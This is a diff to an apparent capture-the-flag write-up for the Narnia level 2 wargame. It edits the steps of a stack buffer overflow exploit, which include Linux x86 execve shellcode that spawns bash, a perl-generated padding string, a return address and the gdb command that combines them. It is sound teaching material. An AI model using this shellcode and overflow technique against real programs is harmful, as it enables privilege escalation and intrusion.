@@ -62,26 +62,23 @@ In the first few seconds I didn't understand what could be done here. But then I
 Let's get started:
 1. shellcode is:
     ```
-    echo "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+    SHELLCODE=$'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
     ```
 
 2. padding is: 
     ```
-    perl -e 'print "A"x(128-33+4)'
+    PADDING=$(perl -e 'print "A"x(128-33+4)')
     ```
 
 3. what is the address of the top of the stack?
 
+    ```
+    SHELLCODE_ADDR=$'\xf8\xd3\xff\xff'
+    ```
+
+Let's combine them together:
 ```
-SHELLCODE=$'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'
-
-SHELLCODE_ADDR=$'\xf8\xd3\xff\xff'
-
-PADDING=$(perl -e 'print "A"x(128-25+4)')
-
 gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
-
-https://packetstormsecurity.com/files/154870/Linux-x86-execve-bin-sh-Shellcode.html
 ```
 
 ## Password for the next level:
